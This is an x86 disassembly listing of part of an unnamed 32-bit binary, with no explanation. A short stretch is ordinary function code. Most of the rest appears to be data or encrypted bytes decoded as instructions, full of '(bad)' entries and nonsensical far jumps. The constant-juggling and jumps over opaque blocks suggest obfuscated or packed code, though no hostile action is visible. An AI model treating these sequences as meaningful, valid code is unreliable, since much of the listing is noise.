  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax-0x7a]
  4111f1:	lahf   
  4111f2:	mov    esi,DWORD PTR [eax-0x12]
  4111f5:	jl     0x41120f
  4111f7:	sbb    BYTE PTR [ecx+0x14],dh
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	pop    es
  4111fd:	inc    edi
  4111fe:	in     eax,0x2e
  411200:	jmp    0x41118e
  411202:	xchg   ecx,eax
  411203:	push   edi
  411204:	stos   BYTE PTR es:[edi],al
  411205:	inc    edx
  411206:	push   ss
  411207:	sub    edi,DWORD PTR ds:0x89ee75cd
  41120d:	inc    edx
  41120e:	out    0xdd,al
  411210:	inc    esp
  411211:	or     al,0xd9
  411213:	xchg   ebx,eax
  411214:	push   ebp
  411215:	xor    eax,0x966b9b1c
  41121a:	pop    eax
  41121b:	(bad)  
  41121c:	jmp    0x6284:0xe5a80a48
  411223:	add    dh,bh
  411225:	adc    BYTE PTR [eax+0xd],bh
  411228:	or     al,BYTE PTR [esi+eax*8]
  41122b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41122c:	fdiv   st(5),st
  41122e:	add    dh,dl
  411230:	push   0xc3af140c
  411235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411236:	push   esp
  411237:	push   0xf41e2444
  41123c:	add    BYTE PTR [esi*1+0x23524831],ch
  411243:	hlt    
  411244:	inc    ecx
  411245:	xchg   DWORD PTR [ebx],esi
  411247:	sar    WORD PTR [edx-0x5854f43b],cl
  41124e:	xor    bl,BYTE PTR [eax]
  411250:	mov    ebx,0x96a39994
  411255:	sti    
  411256:	cmp    al,0xad
  411258:	ret    0xc958
  41125b:	mov    ebp,0xe6e2c4f
  411260:	das    
  411261:	stc    
  411262:	sub    eax,0x61f68994
  411267:	mov    edi,0x6d0e4610
  41126c:	jp     0x41125b
  41126e:	rcl    edx,0xb5
  411271:	pop    eax
  411272:	xchg   edx,eax
  411273:	stos   DWORD PTR es:[edi],eax
  411274:	je     0x4112e8
  411276:	sar    BYTE PTR [esi],1
  411278:	cmp    esp,DWORD PTR [ebx-0x4d]
  41127b:	mov    dh,0x38
  41127d:	lahf   
  41127e:	in     eax,0xfb
  411280:	jno    0x4112bd
  411282:	adc    esp,DWORD PTR [edx+0x57a902d8]
  411288:	cmc    
  411289:	scas   al,BYTE PTR es:[edi]
  41128a:	dec    ebp
  41128b:	adc    eax,0x2212c81a
  411290:	add    DWORD PTR [ebp+0x51f9d11c],esi
  411296:	sub    al,BYTE PTR [ebp+0x17d0bfae]
  41129c:	cli    
  41129d:	pop    esi
  41129e:	(bad)  
  41129f:	jge    0x411314
  4112a1:	test   al,0x4f
  4112a3:	push   ebp
  4112a4:	mov    ah,0x9f
  4112a6:	les    ebp,FWORD PTR [ebx]
  4112a8:	iret   
  4112a9:	pop    esi
  4112aa:	fidiv  WORD PTR [esi]
  4112ac:	std    
  4112ad:	adc    eax,DWORD PTR [edi+0x6ce4a000]
  4112b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112b4:	sar    ebp,0x71
  4112b7:	or     DWORD PTR [eax-0x20],esp
  4112ba:	arpl   WORD PTR [edx+0x2f],ax
  4112bd:	or     bl,al
  4112bf:	mov    edi,0xccf854ea
  4112c4:	das    
  4112c5:	jle    0x411324
  4112c7:	mov    dh,0xfe
  4112c9:	dec    ebp
  4112ca:	popw   ds
  4112cc:	push   eax
  4112cd:	adc    DWORD PTR [eax],ebp
  4112cf:	stos   BYTE PTR es:[edi],al
  4112d0:	fsubr  QWORD PTR [edx]
  4112d2:	mov    edi,0xd56fa49a
  4112d7:	mov    dl,0x21
  4112d9:	and    esp,ebp
  4112db:	(bad)  
  4112dc:	mov    ah,0x12
  4112de:	push   eax
  4112df:	std    
  4112e0:	mov    bl,0x6d
  4112e2:	fwait
  4112e3:	adc    eax,0x8e41c388
  4112e8:	mov    ebx,0x531e312e
  4112ed:	cmp    BYTE PTR [edi*8+0x6753fb78],cl
  4112f4:	mov    bl,BYTE PTR [edi]
  4112f6:	mov    WORD PTR [esi-0x1720ade6],fs
  4112fc:	es retf 0x5789
  411300:	sub    ebp,DWORD PTR [edi+0x3fef6eb3]
  411306:	(bad)  
  411307:	xchg   esi,eax
  411308:	inc    esp
  411309:	js     0x411374
  41130b:	cld    
  41130c:	mov    esp,0x23931bad
  411311:	pop    eax
  411312:	fcomp  QWORD PTR [edx+ebx*1]
  411315:	dec    ebx
  411316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411317:	mov    edx,gs
  411319:	lods   al,BYTE PTR ds:[esi]
  41131a:	push   edx
  41131b:	and    DWORD PTR [ecx-0x2fa6ec9b],ebx
  411321:	xchg   ebp,eax
  411322:	xlat   BYTE PTR ds:[ebx]
  411323:	jno    0x4112b0
  411325:	arpl   WORD PTR [eax],cx
  411327:	pop    ds
  411328:	nop
  411329:	out    0x91,al
  41132b:	push   edi
  41132c:	es dec ebx
  41132e:	xchg   BYTE PTR [eax-0x45],ch
  411331:	lahf   
  411332:	(bad)  
  411333:	cdq    
  411334:	xchg   ch,ch
  411336:	fs fs mov ah,0x68
  41133a:	xchg   ecx,eax
  41133b:	jmp    0xe8ea:0x20915f9b
  411342:	mov    ebp,0x2fe9a863
  411347:	popf   
  411348:	cdq    
  411349:	jno    0x411397
  41134b:	xchg   esi,eax
  41134c:	pop    eax
  41134d:	xor    al,0x77
  41134f:	xor    eax,0xc97d6abd
  411354:	bound  ebp,QWORD PTR [edx]
  411356:	jne    0x411338
  411358:	pop    esp
  411359:	daa    
  41135a:	adc    DWORD PTR [edx],ebp
  41135c:	xlat   BYTE PTR ds:[ebx]
  41135d:	inc    ebp
  41135e:	test   DWORD PTR [esi],edx
  411360:	in     al,dx
  411361:	xchg   ebp,eax
  411362:	stc    
  411363:	xchg   ecx,eax
  411364:	inc    esi
  411365:	xor    DWORD PTR [ebx-0x7789bd16],0xd2977c90
  41136f:	push   ebx
  411370:	add    ebx,DWORD PTR [edx]
  411372:	mov    WORD PTR [edi],ss
  411374:	inc    ebx
  411375:	sbb    cl,BYTE PTR [edx+0x6f]
  411378:	xchg   edx,eax
  411379:	mov    al,0x18
  41137b:	daa    
  41137c:	sbb    ebx,DWORD PTR [esi+0x49676faa]
  411382:	pop    eax
  411383:	jle    0x4113b4
  411385:	popf   
  411386:	sbb    edi,edx
  411388:	in     al,dx
  411389:	push   es
  41138a:	jle    0x411393
  41138c:	add    cl,BYTE PTR [esi+0x11]
  41138f:	out    dx,eax
  411390:	add    BYTE PTR [edx-0x47],ah
  411393:	cld    
  411394:	add    edx,DWORD PTR [esi-0x2c]
  411397:	cdq    
  411398:	ret    
  411399:	lds    edi,FWORD PTR [esi-0x12]
  41139c:	adc    edx,DWORD PTR [edx+0x26b5c7df]
  4113a2:	loopne 0x4113a1
  4113a4:	dec    esp
  4113a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113a6:	fnstsw WORD PTR [eax+0x723a3380]
  4113ac:	iret   
  4113ad:	int    0xbb
  4113af:	mov    fs,WORD PTR [ebp+0x4]
  4113b2:	jmp    0xcf6ff440
  4113b7:	sub    ch,dl
  4113b9:	inc    edi
  4113ba:	icebp  
  4113bb:	mov    dl,ch
  4113bd:	(bad)  
  4113bf:	daa    
  4113c0:	jne    0x411436
  4113c2:	sub    ah,BYTE PTR [edi*2+0xbd315af]
  4113c9:	push   0x27
  4113cb:	shl    BYTE PTR [ebx+0x64],1
  4113ce:	dec    edx
  4113cf:	mov    al,0x91
  4113d1:	pushf  
  4113d2:	adc    al,0x72
  4113d4:	adc    bl,BYTE PTR [ebx+0x52]
  4113d7:	adc    esi,esi
  4113d9:	int    0xf5
  4113db:	call   0x4e4d1a87
  4113e0:	test   BYTE PTR [ebx-0x5c],dl
  4113e3:	ds jns 0x4113ca
  4113e6:	pop    es
  4113e7:	fldenv [ebp-0x21]
  4113ea:	cmp    bl,BYTE PTR [edx-0x5e]
  4113ed:	repnz mov ebp,0xc0aae0be
  4113f3:	sub    eax,0xa60faa2
  4113f8:	jns    0x411479
  4113fa:	cs in  eax,dx
  4113fc:	cmp    ch,BYTE PTR [edi]
  4113fe:	mov    WORD PTR [edx+0x2d],?
  411401:	cmp    edx,ebp
  411403:	cwde   
  411404:	test   DWORD PTR [ecx-0x3b],edi
  411407:	cmp    BYTE PTR [ebp+0x71e52af2],ah
  41140d:	retf   0x564b
  411410:	and    DWORD PTR [ebx-0x32],edi
  411413:	in     eax,0x2b
  411415:	imul   esp,DWORD PTR [eax+0x51],0xd9579690
  41141c:	loopne 0x411405
  41141e:	int    0xff
  411420:	out    dx,al
  411421:	sub    DWORD PTR [edi-0x20],ecx
  411424:	es mov dh,0x8f
  411427:	inc    ebx
  411428:	ins    BYTE PTR es:[edi],dx
  411429:	cmp    al,0xee
  41142b:	test   al,0x2c
  41142d:	int    0xa7
  41142f:	jl     0x41142d
  411431:	xor    bl,BYTE PTR [edi]
  411433:	jae    0x411416
  411435:	hlt    
  411436:	cs adc eax,0x11a68b8f
  41143c:	sub    edx,ecx
  41143e:	jmp    0x5e09:0xff870134
  411445:	push   esi
  411446:	dec    ebx
  411447:	cmp    eax,0xb2fc9781
  41144c:	jns    0x41148e
  41144e:	or     edx,DWORD PTR [eax]
  411450:	xchg   esp,eax
  411451:	dec    ecx
  411452:	mov    DWORD PTR [edx-0x39],eax
  411455:	test   DWORD PTR [eax-0x1],edx
  411458:	(bad)  
  411459:	jmp    DWORD PTR [ebp+esi*2+0x0]
  41145d:	add    bh,al
  41145f:	test   DWORD PTR [edi+edi*8-0x1],edx
  411463:	dec    edi
  411465:	sbb    BYTE PTR [eax],al
  411467:	add    bh,al
  411469:	test   DWORD PTR [eax-0x1],esp
  41146c:	(bad)  
  41146d:	push   DWORD PTR ds:0xc7000031
  411473:	test   DWORD PTR [edi+edi*8-0x1],esp
  411477:	dec    DWORD PTR [ebp-0x38ffffaa]
  41147d:	test   DWORD PTR [eax-0x1],esi
  411480:	(bad)  
  411481:	push   edx
  411483:	adc    DWORD PTR [eax],eax
  411485:	add    bh,al
  411487:	test   DWORD PTR [edi+edi*8-0x1],esi
  41148b:	(bad)  
  41148c:	jmp    0xf045:0xc7000063
  411493:	data16 xor BYTE PTR [eax],al
  411496:	add    bh,al
  411498:	inc    ebp
  411499:	clc    
  41149a:	shr    BYTE PTR [esi+0x0],cl
  41149d:	add    BYTE PTR [eax+0x1d],ch
  4114a0:	jle    0x4114a2
  4114a2:	add    cl,ch
  4114a4:	jo     0x4114a8
  4114a6:	add    BYTE PTR [eax],al
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax+0x3d7e2188]
  4114b5:	retf   0x7c79
  4114b8:	inc    edi
  4114b9:	js     0x4114d3
  4114bb:	sbb    BYTE PTR [ecx+0x14],dh
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	out    dx,al
  4114c1:	adc    dl,BYTE PTR [ecx+0x7c6adade]
  4114c7:	ret    
  4114c8:	retf   
  4114c9:	pop    esp
  4114ca:	fisttp QWORD PTR [edi-0xe09bf60]
  4114d0:	pop    ebp
  4114d1:	xor    ecx,DWORD PTR [eax+0x6b]
  4114d4:	mov    BYTE PTR [esi-0xb],dh
  4114d7:	loope  0x411476
  4114d9:	leave  
  4114da:	jne    0x411467
  4114dc:	pop    DWORD PTR [edi]
  4114de:	daa    
  4114df:	imul   ebp,ecx,0x1
  4114e2:	sub    eax,0x1a58bc93
  4114e7:	or     DWORD PTR [eax+edi*1],ebp
  4114ea:	jb     0x411556
  4114ec:	cmp    eax,0xddfb8782
  4114f1:	jbe    0x4114bc
  4114f3:	add    al,0xe7
  4114f5:	add    bh,BYTE PTR [esi+0x58]
  4114f8:	push   esi
  4114f9:	(bad)  
  4114fa:	xchg   edx,eax
  4114fb:	add    dl,BYTE PTR [bx-0x5c]
  4114ff:	mov    ds:0x516fd100,al
  411504:	push   esp
  411505:	std    
  411506:	std    
  411507:	push   0xd5478d12
  41150c:	mov    edi,0x6f4c1b3
  411511:	repnz or DWORD PTR [edx],0x425d80be
  411518:	(bad)  
  411519:	mov    esp,DWORD PTR [esi+0x5e]
  41151c:	sub    al,0x90
  41151e:	out    0x4e,eax
  411520:	dec    ecx
  411521:	dec    edi
  411522:	aaa    
  411523:	lock dec edi
  411525:	mov    al,ds:0x4e3d050e
  41152a:	jbe    0x411594
  41152c:	ror    al,1
  41152e:	ficomp DWORD PTR ss:[ebx]
  411531:	pop    ds
  411532:	fcom   QWORD PTR [esi+0x454e9f3c]
  411538:	ror    BYTE PTR [esi+esi*2+0x26],0xf2
  41153d:	arpl   WORD PTR [esi+0x2abf3ff9],di
  411543:	push   edi
  411544:	or     al,0xf
  411546:	dec    ecx
  411547:	mov    ah,BYTE PTR [edx]
  411549:	mov    ebp,0x53f629e9
  41154e:	aaa    
  41154f:	xor    al,0x91
  411551:	popa   
  411552:	mov    esp,0x8945faf2
  411557:	cli    
  411558:	popa   
  411559:	xor    ah,BYTE PTR [ebp-0x2c3a72fa]
  41155f:	ss popa 
  411561:	rcl    DWORD PTR [edi],0x87
  411564:	in     eax,0xc8
  411566:	clc    
  411567:	and    BYTE PTR [edx+0x66],cl
  41156a:	pop    edi
  41156b:	repz and esi,ebx
  41156e:	std    
  41156f:	pop    esi
  411570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411571:	ins    BYTE PTR es:[edi],dx
  411572:	dec    ebx
  411573:	(bad)  
  411575:	repz add ch,BYTE PTR [ecx-0x2ce1e544]
  41157c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41157d:	repz and al,0xa
  411580:	push   0xffffff9c
  411582:	stos   BYTE PTR es:[edi],al
  411583:	pop    eax
  411584:	dec    ecx
  411585:	call   0x264876bf
  41158a:	js     0x41155d
  41158c:	stos   BYTE PTR es:[edi],al
  41158d:	lods   eax,DWORD PTR ds:[esi]
  41158e:	sub    al,0xc4
  411590:	sub    DWORD PTR [esi+0x1a],esi
  411593:	cmp    al,0x81
  411595:	and    edi,edi
  411597:	mov    ebp,0xd716e967
  41159c:	fcom   DWORD PTR [eax-0x2f]
  41159f:	push   ecx
  4115a0:	jo     0x41159e
  4115a2:	mov    eax,0x22563ce5
  4115a7:	out    dx,al
  4115a8:	pop    edi
  4115a9:	and    al,0x85
  4115ab:	dec    ecx
  4115ac:	sahf   
  4115ad:	loope  0x41158a
  4115af:	mov    eax,0xfd27d166
  4115b4:	pop    ebp
  4115b5:	push   ebx
  4115b6:	dec    ecx
  4115b7:	rcl    dh,cl
  4115b9:	(bad)  
  4115ba:	rcr    DWORD PTR [edx],cl
  4115bc:	sub    eax,0x6f54b794
  4115c1:	shl    DWORD PTR [ebx-0x29],1
  4115c4:	adc    cl,BYTE PTR ss:[esi]
  4115c7:	add    DWORD PTR [eax-0x4104f670],esi
  4115cd:	scas   eax,DWORD PTR es:[edi]
  4115ce:	sti    
  4115cf:	xchg   ebp,eax
  4115d0:	mov    bl,0x22
  4115d2:	xchg   eax,ecx
  4115d4:	int    0xb8
  4115d6:	push   ebp
  4115d7:	mov    ds:0x127b2937,eax
  4115dc:	jge    0x411594
  4115de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115df:	dec    eax
  4115e0:	es aas 
  4115e2:	xchg   esi,eax
  4115e3:	mov    ebx,0xeb1dcc64
  4115e8:	cld    
  4115e9:	mov    ecx,esp
  4115eb:	mov    BYTE PTR [esp+ebx*4-0x23],cl
  4115ef:	jmp    0x2040:0x45cb5376
  4115f6:	adc    BYTE PTR [edx],cl
  4115f8:	test   DWORD PTR [eax],eax
  4115fa:	lahf   
  4115fb:	das    
  4115fc:	popf   
  4115fd:	inc    eax
  4115fe:	mov    eax,0xf57113cb
  411604:	or     DWORD PTR [ecx],0xb
  411607:	jb     0x411665
  411609:	aaa    
  41160a:	cmp    cl,BYTE PTR [edx+0x2fe92320]
  411610:	aas    
  411611:	push   edi
  411612:	arpl   WORD PTR [ebx],di
  411614:	sbb    BYTE PTR [ebx+0x294b57dc],bl
  41161a:	int    0x9
  41161c:	into   
  41161d:	mov    esp,0x65e7ecf1
  411623:	or     eax,DWORD PTR [edx-0x5e0a9d80]
  411629:	int    0x32
  41162b:	xchg   edi,eax
  41162c:	sub    al,0x92
  41162e:	out    0x67,al
  411630:	(bad)  
  411631:	idiv   DWORD PTR [ebx+0x78]
  411634:	mov    ebp,0xf3ed8995
  411639:	sbb    ebp,esi
  41163b:	adc    al,dh
  41163d:	add    BYTE PTR [esi+0x2b],dh
  411640:	ins    BYTE PTR es:[edi],dx
  411641:	xchg   ecx,eax
  411642:	leave  
  411643:	out    dx,al
  411644:	mov    DWORD PTR [ebp-0x61],esp
  411647:	xchg   BYTE PTR [esi-0x1cc1879f],ch
  41164d:	int3   
  41164e:	fdivr  QWORD PTR [ebx+0x1a]
  411651:	add    eax,0x2069eb2
  411656:	nop
  411657:	dec    ebx
  411658:	xlat   BYTE PTR ds:[ebx]
  411659:	xchg   ebp,eax
  41165a:	adc    dl,cl
  41165c:	into   
  41165d:	fistp  WORD PTR [esi+0x49]
  411660:	dec    edx
  411661:	pusha  
  411662:	in     al,dx
  411663:	and    DWORD PTR [ebx+0x59],esp
  411666:	popa   
  411667:	push   ebx
  411668:	push   0x43
  41166a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41166b:	fbld   TBYTE PTR [esi-0x42042a55]
  411671:	jg     0x4116a2
  411673:	mov    esi,0x526459bd
  411678:	leave  
  411679:	add    al,BYTE PTR [eax-0x26f77e34]
  41167f:	xchg   esi,eax
  411680:	adc    esi,DWORD PTR [ecx-0x63ec7449]
  411686:	test   BYTE PTR [ecx],bl
  411688:	jecxz  0x4116a5
  41168a:	bound  esi,QWORD PTR [edx]
  41168c:	ror    DWORD PTR [esi-0x51b6692c],1
  411692:	daa    
  411693:	push   cs
  411694:	jo     0x41169c
  411696:	or     dl,BYTE PTR ds:0x90a5813e
  41169c:	adc    al,0x82
  41169e:	mov    edx,0x9c298d6e
  4116a3:	push   0xffffffb8
  4116a5:	mov    al,ds:0x19dbd199
  4116aa:	cmc    
  4116ab:	push   ebp
  4116ac:	dec    ebx
  4116ad:	fld    TBYTE PTR [ebx+0x23]
  4116b0:	jg     0x4116f6
  4116b2:	add    BYTE PTR [ebx],0xd2
  4116b5:	xor    esi,edx
  4116b7:	mov    dh,BYTE PTR [eax-0x41]
  4116ba:	sti    
  4116bb:	jle    0x4116c7
  4116bd:	cmp    eax,esi
  4116bf:	mov    al,0x3a
  4116c1:	cmp    BYTE PTR [edi-0x15],al
  4116c4:	sbb    cl,BYTE PTR [edx-0x6c]
  4116c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116c8:	sti    
  4116c9:	xor    eax,ebp
  4116cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116cc:	push   es
  4116cd:	dec    ebp
  4116ce:	sub    cl,BYTE PTR [edx-0x3f]
  4116d1:	and    bl,bh
  4116d3:	push   ecx
  4116d4:	mov    ss,WORD PTR [edi+0x6096fd0f]
  4116da:	cmp    esp,edi
  4116dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116dd:	in     eax,0x77
  4116df:	xchg   esp,eax
  4116e0:	imul   eax,DWORD PTR [ebp-0x5f96ce8e],0x4b
  4116e7:	sbb    edx,ecx
  4116e9:	ins    DWORD PTR es:[edi],dx
  4116ea:	aam    0x7d
  4116ec:	loope  0x41171a
  4116ee:	xchg   ebp,eax
  4116ef:	mov    cl,0xcf
  4116f1:	test   al,0x7a
  4116f3:	inc    ebx
  4116f4:	jmp    0xf2bf:0x56f72479
  4116fb:	pop    ebp
  4116fc:	mov    bl,0xe0
  4116fe:	push   edi
  4116ff:	mov    esp,0x7cb03813
  411704:	and    bh,BYTE PTR [esi+ebp*4-0x1e1406a6]
  41170b:	repnz out 0xd9,al
  41170e:	xor    esi,DWORD PTR [edi+ebp*4+0x54d0c1b3]
  411715:	mov    ah,0x3e
  411717:	(bad)  
  411718:	mov    DWORD PTR [ebp-0x4],0x30f4
  41171f:	mov    eax,DWORD PTR [ebp-0x20]
  411722:	mov    ecx,DWORD PTR [ebp-0x1c]
  411725:	push   0x5380
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0x81a2aa57
  411755:	mov    ds:0x18749ebc,eax
  41175a:	sbb    BYTE PTR [ecx+0x14],dh
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	cdq    
  411760:	rol    BYTE PTR [edx-0x1f],0x82
  411764:	push   ecx
  411765:	popf   
  411766:	push   esp
  411767:	fldenv [ebx*2+0x5c27697b]
  41176e:	adc    DWORD PTR [ebp-0x25],edx
  411771:	in     al,dx
  411772:	lds    ebx,FWORD PTR [esi]
  411774:	pop    edi
  411775:	adc    DWORD PTR [ebx+0x5a4e145b],esp
  41177b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41177c:	mov    ah,0x43
  41177e:	dec    esi
  41177f:	jae    0x4117bc
  411781:	mov    esi,0x8141315e
  411786:	(bad)  
  411787:	sbb    dl,cl
  411789:	dec    edx
  41178a:	adc    al,0x48
  41178c:	ret    0xbda3
  41178f:	cmp    bh,BYTE PTR [edx]
  411791:	test   eax,0xca02fc9e
  411796:	mov    esp,0xd8c848f0
  41179b:	cwde   
  41179c:	lds    ebx,FWORD PTR [esi+0x12]
  41179f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117a0:	sbb    bl,BYTE PTR [ecx+esi*8]
  4117a3:	std    
  4117a4:	mov    dl,0xfb
  4117a6:	pusha  
  4117a7:	cdq    
  4117a8:	jmp    0x411811
  4117aa:	jp     0x4117b3
  4117ac:	in     al,dx
  4117ad:	xchg   ebp,eax
  4117ae:	cmp    DWORD PTR [edi+0x5d],ebp
  4117b1:	lods   eax,DWORD PTR ds:[esi]
  4117b2:	sbb    DWORD PTR [ebx-0x1691f229],ebp
  4117b8:	ja     0x4117a9
  4117ba:	mov    edi,0x9ad732cd
  4117bf:	mov    ds:0xb39e68ea,al
  4117c4:	and    edx,DWORD PTR [eax-0x1df908f6]
  4117ca:	repnz dec ebx
  4117cc:	repnz enter 0xd24c,0xe1
  4117d1:	mov    edx,0x8b134bc2
  4117d6:	push   edi
  4117d7:	cmp    BYTE PTR [ebx],ch
  4117d9:	mov    bh,0x64
  4117db:	pop    ds
  4117dc:	inc    eax
  4117dd:	xor    ebp,esp
  4117df:	leave  
  4117e0:	mov    bl,0x6f
  4117e2:	mov    BYTE PTR [edx+0x73b73520],al
  4117e8:	ins    BYTE PTR es:[edi],dx
  4117e9:	mov    DWORD PTR [edi-0x7002b83e],esi
  4117ef:	mov    al,0x45
  4117f1:	arpl   WORD PTR [ecx-0x1],ax
  4117f4:	and    BYTE PTR [edx-0x50189c49],0xac
  4117fb:	xchg   ecx,eax
  4117fc:	and    eax,0xe645bff
  411801:	imul   ecx,DWORD PTR [ebp+0x6a5a7ce2],0x3b7b538d
  41180b:	and    ecx,DWORD PTR [edi-0x4c025bcb]
  411811:	sub    edx,ecx
  411813:	sub    BYTE PTR [ecx+0x44],dl
  411816:	xor    DWORD PTR [eax-0x3ec0ad86],esp
  41181c:	gs aaa 
  41181e:	mov    al,ds:0x6af7e0c4
  411823:	add    DWORD PTR [edx-0x2624fe54],esp
  411829:	push   ebp
  41182a:	sar    esp,0xe8
  41182d:	pop    ds
  41182e:	jns    0x411869
  411830:	call   0x1e1b:0x2c928014
  411837:	jns    0x41180d
  411839:	frstor [edx+edx*8+0x7d]
  41183d:	addr16 ja 0x4117c4
  411840:	mov    ah,0xa3
  411842:	ss pop ss
  411844:	pop    esp
  411845:	sahf   
  411846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411847:	push   edx
  411848:	push   ebx
  411849:	icebp  
  41184a:	lods   al,BYTE PTR ds:[esi]
  41184b:	addr16 iret 
  41184d:	push   cs
  41184e:	ja     0x4117fd
  411850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411851:	lahf   
  411852:	inc    esi
  411853:	leave  
  411854:	hlt    
  411855:	sub    eax,DWORD PTR [edx]
  411857:	jg     0x4118ae
  411859:	mov    al,ds:0x4e07947f
  41185e:	dec    ecx
  41185f:	rol    BYTE PTR [esp+eiz*2+0x1f],cl
  411863:	push   ss
  411864:	fisub  WORD PTR [ecx-0x2d42cf69]
  41186a:	jmp    0x9323:0xc6570bee
  411871:	ret    0x2ba9
  411874:	pop    es
  411875:	lock fcom DWORD PTR [ebp-0x582a432d]
  41187c:	dec    edx
  41187d:	fwait
  41187e:	js     0x4118ec
  411880:	in     al,0xb2
  411882:	mov    ah,0x69
  411884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411885:	sbb    al,0xaa
  411887:	mov    esp,0x9ed6d55a
  41188c:	mov    edi,0xe0491149
  411891:	in     al,dx
  411892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411893:	cld    
  411894:	mov    al,ds:0xd51c8443
  411899:	mov    bh,0x93
  41189b:	data16 lods al,BYTE PTR ds:[esi]
  41189d:	loope  0x4118b2
  41189f:	(bad)  
  4118a0:	cli    
  4118a1:	pop    ebx
  4118a2:	mov    esi,0x7a9da27f
  4118a7:	je     0x41185b
  4118a9:	ja     0x411833
  4118ab:	or     eax,0x87838d98
  4118b0:	xor    al,0x43
  4118b2:	in     al,dx
  4118b3:	fimul  WORD PTR [esp+edi*1]
  4118b6:	popa   
  4118b7:	dec    ebp
  4118b8:	lds    edx,FWORD PTR [edx-0x528ceede]
  4118be:	adc    ecx,DWORD PTR [esi+0x4cde529a]
  4118c4:	das    
  4118c5:	mov    bl,0x58
  4118c7:	fwait
